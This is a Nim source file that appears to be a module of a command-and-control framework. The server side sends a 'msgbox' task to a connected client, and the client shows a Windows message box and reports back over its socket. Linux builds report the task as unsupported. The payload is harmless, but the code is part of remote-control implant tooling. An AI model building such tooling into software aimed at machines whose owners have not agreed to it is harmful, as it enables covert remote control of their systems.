when defined(server):
  import asyncdispatch, json
  import ../server/[types, communication]

when defined(client):
  import ../client/communication
  import net
  when defined(windows):
      import winim/[lean]

when defined(server):
  proc sendTask*(client: C2Client, title: string, caption: string): Future[Task] {.async.} =
    return await client.sendClientTask("msgbox", %*{ "title": title, "caption": caption })

when defined(client):
  when defined(windows):
    proc executeTask*(socket: net.Socket, taskId: int, title: string, caption: string) =
      MessageBox(0, title, caption, 0)
      socket.sendOutput(taskId, "", "", "")
  when defined(linux):
    proc executeTask*(socket: net.Socket, taskId: int, title: string, caption: string) =
      socket.sendOutput(taskId, "", "", "Operation not supported on Linux")
        